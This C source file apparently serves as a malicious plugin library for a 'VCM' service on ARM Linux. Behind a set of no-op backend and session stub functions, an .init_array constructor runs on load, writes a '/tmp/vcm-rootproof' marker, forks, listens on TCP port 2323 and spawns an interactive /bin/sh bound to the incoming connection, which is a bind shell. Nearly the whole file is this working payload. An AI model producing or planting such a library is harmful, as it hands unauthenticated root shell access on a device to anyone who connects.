typedef unsigned short u16;
typedef unsigned int u32;

static long sys3(long n, long a, long b, long c)
{
    register long r7 __asm__("r7") = n;
    register long r0 __asm__("r0") = a;
    register long r1 __asm__("r1") = b;
    register long r2 __asm__("r2") = c;
    __asm__ volatile("svc 0" : "+r"(r0) : "r"(r7), "r"(r1), "r"(r2) : "memory");
    return r0;
}

static void start_shell(void)
{
    static const char proof[] = "vcm root constructor executed\n";
    long fd = sys3(5, (long)"/tmp/vcm-rootproof", 0x241, 0666);
    if (fd >= 0) {
        sys3(4, fd, (long)proof, sizeof(proof) - 1);
        sys3(6, fd, 0, 0);
    }

    if (sys3(2, 0, 0, 0) != 0) return;

    long s = sys3(281, 2, 1, 0); /* socket(AF_INET, SOCK_STREAM, 0) */
    if (s < 0) sys3(1, 121, 0, 0);
    struct { u16 family, port; u32 address; unsigned char zero[8]; } sa = {
        2, 0x1309, 0, {0} /* 0.0.0.0:2323 */
    };
    if (sys3(282, s, (long)&sa, 16) < 0) sys3(1, 122, 0, 0);
    if (sys3(284, s, 1, 0) < 0) sys3(1, 123, 0, 0);
    long c = sys3(285, s, 0, 0);
    if (c < 0) sys3(1, 124, 0, 0);
    sys3(63, c, 0, 0);
    sys3(63, c, 1, 0);
    sys3(63, c, 2, 0);
    char *argv[] = {"sh", "-i", 0};
    char *envp[] = {"PATH=/bin:/usr/bin:/sbin:/usr/sbin", 0};
    sys3(11, (long)"/bin/sh", (long)argv, (long)envp);
    sys3(1, 125, 0, 0);
}

__attribute__((section(".init_array"), used))
static void (*init_entry)(void) = start_shell;

/* VCM treats zero as successful backend initialization.  The real function
 * receives additional arguments, but this no-op backend does not consume them. */
int backend_init(void *a, void *b) { (void)a; (void)b; return 0; }
int backend_term(void *a) { (void)a; return 0; }
int backend_command(void *a, void *b, void *c) { (void)a; (void)b; (void)c; return 0; }
void *session_prepare(void *a, void *b) { (void)a; (void)b; return (void *)1; }
int session_send(void *a, void *b, void *c) { (void)a; (void)b; (void)c; return 0; }
int session_destroy(void *a) { (void)a; return 0; }
